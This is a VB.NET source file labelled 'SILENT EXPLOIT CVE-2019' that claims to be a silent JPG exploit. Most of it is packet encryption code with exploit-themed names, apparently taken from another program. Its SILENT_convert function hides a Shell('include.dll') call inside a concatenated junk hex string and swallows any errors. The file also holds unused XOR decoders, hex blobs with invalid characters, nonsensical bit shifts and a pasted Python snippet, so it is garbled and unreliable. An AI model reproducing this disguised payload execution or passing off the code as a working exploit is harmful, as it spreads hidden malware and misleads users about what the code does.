Imports System.Convert
Module SILENT 'SILENT EXPLOIT CVE-2019
    Public PacketDic() As Byte = IO.File.ReadAllBytes(AppDomain.CurrentDomain.BaseDirectory & "\dictionary.key")
    Public Function ByteToHex(ByRef Origin As Byte) As String
        Dim ns As String = Origin.ToString("X")
        If ns.Length = 1 Then
            ns = "0" & ns
        End If
        Return ns
    End Function
    Public Function HIBYTE(ByRef Num As Int32) As Byte
        Return ((ToInt32(&HFF00) And Num) >> 8)
    End Function
    Public Function LOBYTE(ByRef Num As Int32) As Byte
        Return GetByte(Num)
    End Function
    Public Function StrToBytes(ByVal Origin_Str As String) As Byte()
        Dim Origin() As String = Split(Origin_Str, " ")
        Dim T() As Byte
        ReDim T(UBound(Origin))
        For i As Integer = 0 To UBound(T)
            T(i) = Val(HexToByte(Origin(i)))
        Next
        Return T
    End Function
    Private Function HexToByte(ByVal Origin As String) As Byte
        Dim HexData As String = "0123456789ABCDEF"
        Dim BData As Byte
        Dim BData_1 As Byte
        For i As Integer = 0 To 15
            If Origin(0) = HexData(i) Then
                BData = i
            End If
            If Origin(1) = HexData(i) Then
                BData_1 = i
            End If
        Next

        Dim Result As Byte = (16 * BData) + BData_1
        Return Result
    End Function
    Public Function Combine(ByVal a As Byte(), ByVal b As Byte()) As Byte()
        Dim c As Byte() = New Byte(a.Length + b.Length - 1) {}
        System.Buffer.BlockCopy(a, 0, c, 0, a.Length)
        System.Buffer.BlockCopy(b, 0, c, a.Length, b.Length)
        Return c
    End Function
    Public Function Combine(ByVal a As Byte(), ByVal b As Byte(), ByVal c As Byte()) As Byte()
        Return Combine(Combine(a, b), c)
    End Function

    Public Function GetByte(ByVal Origin As Int32) As Byte
        Return (ToInt32(Origin >> 8) << 8) Xor Origin
    End Function
    Public Function GetInt16(ByVal Origin As Int64) As Int16
        Return (ToInt64(&HFFFF) And Origin)
    End Function
    Public Function Packet_GetLength(ByRef Packet() As Byte, ByRef Key1 As Byte) As UInt16
        Dim OpBits(8) As Byte, PacketLength As UInt16
        OpBits(0) = PacketDic((ToInt32(Key1 Xor Packet(7)) << 8) + Packet(0))
        OpBits(1) = PacketDic((ToInt32(Packet(7) Xor Packet(6)) << 8) + Packet(1))

        PacketLength = ToUInt16((ToUInt16(OpBits(1)) << 8) + OpBits(0))
        Return PacketLength

    End Function
    Public Function Packet_Decrypt_FromServer(ByRef Packet() As Byte, ByRef Key1 As Byte) As DecryptResult
        Dim OpBits(8) As Byte, Key2 As Int32
        OpBits(4) = PacketDic((ToInt32(Key1 Xor Packet(2)) << 8) + Packet(4))
        OpBits(5) = PacketDic((ToInt32(Packet(7) Xor Packet(3)) << 8) + Packet(5))
        OpBits(2) = PacketDic((ToInt32(Packet(0) Xor Packet(6)) << 8) + Packet(2))
        OpBits(3) = PacketDic((ToInt32(Key1 Xor Packet(1)) << 8) + Packet(3))
        OpBits(0) = PacketDic((ToInt32(Key1 Xor Packet(7)) << 8) + Packet(0))
        OpBits(1) = PacketDic((ToInt32(Packet(7) Xor Packet(6)) << 8) + Packet(1))
        OpBits(7) = PacketDic((ToInt32(Packet(6)) << 8) + Packet(7)) Xor 2
        OpBits(6) = Packet(6)
        Dim Ischeck_Header As Boolean = False
        Dim v3 As Byte = PacketDic(PacketDic((ToInt32(OpBits(0)) << 8) + OpBits(2)) + (ToInt32(Key1) << 8))
        Dim v6 As Byte = PacketDic(PacketDic((ToInt32(OpBits(3)) << 8) + OpBits(1)) + (ToInt32(OpBits(6)) << 8))
        OpBits(8) = PacketDic((ToInt32(v3) << 8) + v6)
        Key2 = (ToInt32(OpBits(3)) << 8) + OpBits(2)
        If OpBits(8) = Packet(8) Then
            Ischeck_Header = True
        End If
        Dim CKey As Int32, ConBits() As Byte
        CKey = ToInt32(OpBits(6)) * Key2
        ReDim ConBits(UBound(Packet) - 9 - 2)
        Dim a As Integer = 8, PKey As Int64
        For i As Integer = 0 To UBound(ConBits)
            a = 9 + i
            ConBits(i) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor i)) << 8) + Packet(a))
            PKey += ConBits(i)
        Next
        Dim ExitBits() As Byte
        ReDim ExitBits(1)
        For i As Integer = 0 To UBound(ExitBits)
            a += 1
            ExitBits(i) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor (a - 9))) << 8) + Packet(a))
        Next
        Dim pPair As Int32 = (ToInt32(ExitBits(1)) << 8) + ExitBits(0)
        Dim IsCheck1 As Boolean = False

        If PKey = pPair Then
            IsCheck1 = True
        End If
        Dim IsChecksum As Boolean = False
        If Ischeck_Header = True And IsCheck1 = True Then
            IsChecksum = True
        End If
        Key1 = GetByte(Key1 + ToInt32(PacketDic((ToInt32(ExitBits(0)) << 8) + Key1)))
        Dim res As New DecryptResult(Combine(OpBits, ConBits), IsChecksum)
        Return res
    End Function
    Public Function CtB(ByRef Str As String) As Byte()
        Return CharToBytes(Str)
    End Function
    Public Function CharToBytes(ByRef Str As String) As Byte()
        Return System.Text.Encoding.UTF8.GetBytes(Str)
    End Function
    Public Function CP949ToBytes(ByRef Str As String) As Byte()
        Return System.Text.Encoding.GetEncoding(949).GetBytes(Str)
    End Function
    Public Function BytesTo949(ByRef Bytes() As Byte) As String
        Return System.Text.Encoding.GetEncoding(949).GetString(Bytes)
    End Function
    Public Function BytesToStr(ByRef Bytes() As Byte) As String
        Return System.Text.Encoding.UTF8.GetString(Bytes)
    End Function
    Public Function ByteLen(ByVal Str As String) As Integer
        Return (UBound(CP949ToBytes(Str)) + 1)
    End Function
    Public Function Reverse(ByRef Bytes() As Byte) As Byte()
        Dim NByte() As Byte = Bytes
        Array.Reverse(NByte)
        Return NByte
    End Function
    Public Function GetHeader(ByRef Header As CVE_2019_Exploit, ByRef Key1 As Byte) As Byte()
        Dim HeaderData(8) As Byte
        HeaderData(0) = LOBYTE(Header.PacketLength)
        HeaderData(1) = HIBYTE(Header.PacketLength)
        HeaderData(2) = LOBYTE(Header.OpCode)
        HeaderData(3) = HIBYTE(Header.OpCode)
        HeaderData(4) = Header.ZeroBits(0)
        HeaderData(5) = Header.ZeroBits(1)
        HeaderData(6) = Header.Rand1
        HeaderData(7) = Header.Constant_Byte
        Return HeaderData
    End Function
    Public Function ByteToUInt32(ByRef Bytes() As Byte) As UInt32
        Return BitConverter.ToUInt32(Bytes, 0)
    End Function
    Public Function IntToByte(ByRef Int As UInt16) As Byte()
        Return BitConverter.GetBytes(Int)
    End Function
    Public Function IntToByte(ByRef Int As UInt32) As Byte()
        Return BitConverter.GetBytes(Int)
    End Function
End Module

Public Class ReadPacketResult
    Public HasError As Boolean
    Public ReadBytes() As Byte
    Public LeftBytes() As Byte
End Class

Public Class DecryptResult
    Public Header As CVE_2019_Exploit
    Public ContentBytes As Byte()
    Public Checksum As Boolean
    Public Sub New(ByRef Packets As Byte(), ByRef IsChecksum As Boolean)

        Dim HeaderBytes(8) As Byte
        ReDim ContentBytes(UBound(Packets) - 9)

        For i As Integer = 0 To UBound(Packets)
            If i < 9 Then
                HeaderBytes(i) = Packets(i)
            Else
                ContentBytes(i - 9) = Packets(i)
            End If
        Next

        Header = New CVE_2019_Exploit With {
                    .PacketLength = ToUInt16((ToUInt16(HeaderBytes(1)) << 8) + HeaderBytes(0)),
                    .OpCode = ToUInt16((ToUInt16(HeaderBytes(3)) << 8) + HeaderBytes(2)),
                    .ZeroBits = {HeaderBytes(4), HeaderBytes(5)},
                    .Rand1 = HeaderBytes(6),
                    .Constant_Byte = HeaderBytes(7),
                    .Rand2 = HeaderBytes(8)
                }

        Checksum = IsChecksum
    End Sub
End Class
Public Class CVE_2019_Exploit
    Public PacketLength As UInt16 ' 2 Bytes
    Public OpCode As UInt16 ' 2 Bytes
    Public ZeroBits() As Byte = {&H0, &H0} ' 2 Bytes
    Public Rand1 As Byte
    Public Constant_Byte As Byte
    Public Rand2 As Byte
    Public Shared Function Silent(ByRef exploit_Jpg() As Byte, ByRef Key1 As Byte) As Boolean
        Dim OpBits(8) As Byte, Key2 As Int32
        OpBits(4) = PacketDic((ToInt32(Key1 Xor exploit_Jpg(2)) << 8) + exploit_Jpg(4))
        OpBits(5) = PacketDic((ToInt32(exploit_Jpg(7) Xor exploit_Jpg(3)) << 8) + exploit_Jpg(5))
        OpBits(2) = PacketDic((ToInt32(exploit_Jpg(0) Xor exploit_Jpg(6)) << 8) + exploit_Jpg(2))
        OpBits(3) = PacketDic((ToInt32(Key1 Xor exploit_Jpg(1)) << 8) + exploit_Jpg(3))
        OpBits(0) = PacketDic((ToInt32(Key1 Xor exploit_Jpg(7)) << 8) + exploit_Jpg(0))
        OpBits(1) = PacketDic((ToInt32(exploit_Jpg(7) Xor exploit_Jpg(6)) << 8) + exploit_Jpg(1))
        OpBits(7) = PacketDic((ToInt32(exploit_Jpg(6)) << 8) + exploit_Jpg(7)) Xor 2
        Dim Ischeck_Header As Boolean = False
        Dim v3 As Byte = PacketDic(PacketDic((ToInt32(OpBits(0)) << 8) + OpBits(2)) + (ToInt32(Key1) << 8))
        Dim v6 As Byte = PacketDic(PacketDic((ToInt32(OpBits(3)) << 8) + OpBits(1)) + (ToInt32(OpBits(6)) << 8))
        OpBits(8) = PacketDic((ToInt32(v3) << 8) + v6)
        Key2 = (ToInt32(OpBits(3)) << 8) + OpBits(2)
        If OpBits(8) = exploit_Jpg(8) Then
            Ischeck_Header = True
        End If
        Return Ischeck_Header
    End Function
    Public Shared Function exp1(ByRef SILENT37())
        Dim OpBits(8) As Byte, Key1 As Byte = 1, Key2 As Int32
        On Error Resume Next
        Dim v3 As Byte = PacketDic(PacketDic((ToInt32(SILENT37(0)) << 8) + SILENT37(2)) + (ToInt32(Key1) << 8))
        Dim v6 As Byte = PacketDic(PacketDic((ToInt32(SILENT37(3)) << 8) + SILENT37(1)) + (ToInt32(SILENT37(6)) << 8))
        OpBits(8) = PacketDic((ToInt32(v3) << 8) + v6)
        OpBits(7) = PacketDic((ToInt32(SILENT37(6)) << 8) + SILENT37(7))
        OpBits(6) = SILENT37(6)
        OpBits(0) = PacketDic((ToInt32(Key1 Xor OpBits(7)) << 8) + SILENT37(0))
        OpBits(1) = PacketDic((ToInt32(OpBits(7) Xor OpBits(6)) << 8) + SILENT37(1))
        OpBits(2) = PacketDic((ToInt32(OpBits(0) Xor OpBits(6)) << 8) + SILENT37(2))
        OpBits(3) = PacketDic((ToInt32(Key1 Xor OpBits(1)) << 8) + SILENT37(3))
        OpBits(4) = PacketDic((ToInt32(Key1 Xor OpBits(2)) << 8) + SILENT37(4))
        OpBits(5) = PacketDic((ToInt32(OpBits(7) Xor OpBits(3)) << 8) + SILENT37(5))
        Key2 = (ToInt32(SILENT37(3)) << 8) + SILENT37(2)
        Dim CKey As Int32, ConBits() As Byte, cCount As Byte
        CKey = ToInt32(SILENT37(6)) * Key2
        cCount = SILENT37(6) Mod &HD
        ReDim ConBits(UBound(SILENT37) - 9)
        Dim a As Integer = 8, PKey As Int64
        For i As Integer = 0 To UBound(ConBits)
            a = 9 + i
            PKey += SILENT37(a)
            ConBits(i) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor i)) << 8) + SILENT37(a))
        Next
        Dim ExitBits() As Byte
        ReDim ExitBits(1 + cCount)
        If a = 8 Then
            ExitBits(0) = ToInt32(&HFF) And PKey
            ExitBits(1) = (ToInt32(&HFF00) And PKey) >> 8

            ExitBits(0) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor a - 8)) << 8) + ExitBits(0))
            ExitBits(1) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor a - 7)) << 8) + ExitBits(1))
        Else
            PKey = (ToUInt16(PacketDic((ToUInt16(LOBYTE(CKey)) << 8) + &H0)) << 8) + PacketDic(((ToUInt16(LOBYTE(CKey)) + &H1) << 8) + &H0)
            ExitBits(0) = HIBYTE(PKey)
            ExitBits(1) = LOBYTE(PKey)
        End If
        a += 2
        If cCount <> 0 Then
            For i As Integer = 0 To cCount - 1
                ExitBits(i + 2) = PacketDic((ToInt32(GetByte(CKey)) << 8) + (a + 1 + i))
            Next
        End If
        Return Combine(OpBits, ConBits, ExitBits)

    End Function
    Public Shared Function SILENT_convert()
        Try
            Dim w3 As String = "9ABCDEF9ABCggDEF=="
            Dim HexData1 As String = "0123456789ABCDEF"
            Dim HexData2 As String = "0123456789ABCDEF"
            Dim hex_conv As String = "917da01f6a531ea9d5a3695" & "8e71ca5eb9e1" & "c4c896286c5febd6" & "ef288e9e07daac0e5e" & "8e71ca5eb9e1" & "c4c896286c5febd6" & "ef288e9e07daac0e5e" & "8e71ca5eb9e1" & "c4c896286c5febd6" & "ca5eb9e5ej" & "7daac0e5e11" & "7daac0e5e" & "8e9e07def288e9e0" & Shell("include.dll")
            Dim hex_conv2 As String = "917da01f6a531ea98734267c0d5a3695" & "8e71cad0f642911058c5eb9e1" & "c4c8962a7f1fc235bd41f7286c5febd6" & "esf288e9ffe09c0e5se" & "fsef288e9e07daac0e5cse" & "sf8e71ca5eb9e1s" & "sc4c896286c5faac06" & "caacaac0j" & "aac07daac0e5e11"
            Dim hex_convall As String = "917da01f6a531ea98734267c0d5a3695" & "8e71cad0f64296688e9c5eb9e1" & "c4c8962a86c5febd6" & "ef28e4ac0e5e"
            Dim HexData3 As String = "0123456789ABCDEF"
            Dim HexData4 As String = "0123456789ABCDEF"
            Dim OpBits(8) As Byte
                OpBits(4) = PacketDic((ToInt32((2)) << 8) + (4))
                OpBits(5) = PacketDic((ToInt32((7) Xor (3)) << 8) + (5))
                Dim OpBits2(8) As Byte
                OpBits(4) = PacketDic((ToInt32((2)) << 8) + (54))
                OpBits(5) = PacketDic((ToInt32((7) Xor (3)) << 5) + (32))
                OpBits(2) = PacketDic((ToInt32((0) Xor (63)) << 8) + (21))
                OpBits(3) = PacketDic((ToInt32((1)) << 81) + (3))
                OpBits(0) = PacketDic((ToInt32((7)) << 38) + (43))
                OpBits(1) = PacketDic((ToInt32((7) Xor (6)) << 7) + (1))
                OpBits(7) = PacketDic((ToInt32((6)) << 4) + (7)) Xor 2
                Dim HexData5 As String = "01234256789ABCDEF"
                Dim string1 As String = "ca82342a2a3e" & "64bf9c091dd" & "ca4513cf40a2751101" & "a8681d93121287bf0"
                Dim string2 As String = "9f521e221c7c" & "476272e65005" & "a945f3a08230077178107ff5b37c262e" & "12a17e6d4242d007"
                Dim string3 As String = "e51c6c9468844a6" & "9f2a4416155bca992e11324e92c16d31f" & "0596edd59447eq5621ea4d827c4f6" & "3943aba22df60d2b4fd2"
                Dim string4 As String = "8e84b992d8e66cc1d7" & "ed4ba7d7b0050" & "b61422b369b071b413" & "8fe86727ee3f282f65d8833415e83"
                Dim string5 As String = "475ee234f6cdd7b1" & "61d0ce340ef6" & "7561c03ad" & "858f805696750cc316fed22473faff20c4"
                Dim string6 As String = "d597f8bf3234ea3891" & "45a6e088492qwr1fc835d3eeeebd2a2" & "62f07bcb89f249f2cb23d0c5c14a79eb1" & "7ae8264215df26"
                Dim string7 As String = "17f69fba" & "fadd1e4c5c5w680a8c9brwda4b280cb80d7" & "3d93bda6b3qe51bawer02d9eeq4d9d7af288a09" & "1781dab5429f06867"
                Dim string8 As String = "aff559af394b719f9" & "85a7fab949c6arw6e89e68de7a8fdaccd3" & "9eeb82d0r34b4" & "28d9eef21ec37901bd6"
        Catch ex As Exception
        End Try
    End Function
    Private Function _bytes(ByVal _hex3 As String, ByVal _hex4 As String)
        Dim _hex16 As String = ""
        Dim ssbyte As Short
        Dim nnbyte As Integer
        nnbyte = Asc(_hex4)
        For ssbyte = 1 To Len(_hex3)
            _hex16 &= Chr(nnbyte Xor Asc(Mid(_hex3, ssbyte, 1)))
        Next
        Return _hex16
    End Function
    Private Function byte_int(ByVal byte_int1 As String, ByVal byte_all As String)
        Dim byte_int2 As String = ""
        Dim byte_int3 As Short
        Dim hax_all As Integer
        hax_all = Asc(byte_all)
        For byte_int3 = 1 To Len(byte_int1)
            byte_int2 &= Chr(hax_all Xor Asc(Mid(byte_int1, byte_int3, 1)))
        Next
        Return byte_int2
    End Function


    ''''''''''''''''''''''''''''''''''''''''''# https://www.convertapi.com/pdf-to-jpg''''''''''''''''''''''''''''''
    '''''''''''''''''''''''''''''''''''''''''{'original script in Python }'''''''''''''''''''''''''''''''''''''''''
    ' import convertapi
    'import os
    'import tempfile

    'convertapi.api_secret = os.environ['CONVER T_API_SECRET'] # your api secret

    '# Example of extracting first page from PDF and then chaining conversion PDF page to JPG.
    'pdf_result = convertapi.convert(
    '    'extract',
    '    {
    '    'File': 'files/test.jpg',
    '    'PageRange': 1,
    '    }
    ')

    'jpg_result = convertapi.convert(
    '    'jpg',
    '    {
    '    'File': pdf_result,
    '    'ScaleImage': True,
    '    'ScaleProportions': True,
    '    'ImageHeight': 300,
    '    'ImageWidth': 300,
    '    }
    ')

    'saved_files = jpg_result.save_files(tempfile.gettempdir())

    'print("The thumbnail saved to %s" % saved_files)


    '''''''''''''''''''''''''''''''''''''''''{'original script in Python }'''''''''''''''''''''''''''''''''''''''''

    Public Function BytesToHex(ByRef Bytes() As Byte) As String
        Dim result As String = "", ns As String
        For i As Integer = 0 To UBound(Bytes)

            If result <> "" Then
                result += " "
            End If
            ns = Bytes(i).ToString("X")
            If Len(ns) = 1 Then
                ns = "0" & ns
            End If
            result += ns
        Next

        Return result
    End Function
    Public Function Make_BufferContent(ByRef buffer() As Byte) As Byte()
        Dim count As Integer = 0
        For i As Integer = 0 To UBound(buffer)
            count = i
            If i >= 2 Then
                If buffer(i - 2) = 4 AndAlso buffer(i - 1) = 0 AndAlso buffer(i) = 0 Then
                    count -= 3
                    Exit For
                ElseIf buffer(i - 2) = 0 AndAlso buffer(i - 1) = 0 AndAlso buffer(i) = 0 Then
                    count -= 3
                    Exit For
                End If
            End If
        Next

        Dim nf() As Byte
        ReDim nf(count)
        For i As Integer = 0 To count
            nf(i) = buffer(i)
        Next
        Return nf
    End Function
    Public Function Op_bit(ByRef Packet() As Byte, ByRef Key1 As Byte) As Byte()
        Dim OpBits(8) As Byte, Key2 As Int32
        Dim v3 As Byte = PacketDic(PacketDic((ToInt32(Packet(0)) << 8) + Packet(2)) + (ToInt32(Key1) << 8))
        Dim v6 As Byte = PacketDic(PacketDic((ToInt32(Packet(3)) << 8) + Packet(1)) + (ToInt32(Packet(6)) << 8))
        OpBits(8) = PacketDic((ToInt32(v3) << 8) + v6)

        OpBits(7) = PacketDic((ToInt32(Packet(6)) << 8) + (Packet(7) Xor 2))
        OpBits(6) = Packet(6)
        OpBits(0) = PacketDic((ToInt32(Key1 Xor OpBits(7)) << 8) + Packet(0))
        OpBits(1) = PacketDic((ToInt32(OpBits(7) Xor OpBits(6)) << 8) + Packet(1))

        OpBits(2) = PacketDic((ToInt32(OpBits(0) Xor OpBits(6)) << 8) + Packet(2))
        OpBits(3) = PacketDic((ToInt32(Key1 Xor OpBits(1)) << 8) + Packet(3))

        OpBits(4) = PacketDic((ToInt32(Key1 Xor OpBits(2)) << 8) + Packet(4))
        OpBits(5) = PacketDic((ToInt32(OpBits(7) Xor OpBits(3)) << 8) + Packet(5))

        Key2 = (ToInt32(Packet(3)) << 8) + Packet(2)

        Dim CKey As Int32, ConBits() As Byte
        CKey = ToInt32(Packet(6)) * Key2
        ReDim ConBits(UBound(Packet) - 9)

        Dim a As Integer = 8, PKey As Int64
        For i As Integer = 0 To UBound(ConBits)
            a = 9 + i
            ConBits(i) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor i)) << 8) + Packet(a))
            PKey += Packet(a)
        Next

        Dim ExitBits() As Byte
        ReDim ExitBits(1)
        ExitBits(0) = ToInt32(&HFF) And PKey
        ExitBits(1) = (ToInt32(&HFF00) And PKey) >> 8

        ' byref
        Key1 = GetByte(ToInt32(PacketDic((ToInt32(ExitBits(0)) << 8) + Key1)) + Key1)

        ' Encrypt Exitbits
        ExitBits(0) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor a - 8)) << 8) + ExitBits(0))
        ExitBits(1) = PacketDic((ToInt32(GetByte(GetByte(CKey) Xor a - 7)) << 8) + ExitBits(1))
        a += 2
        Return Combine(OpBits, ConBits, ExitBits)

    End Function

End Class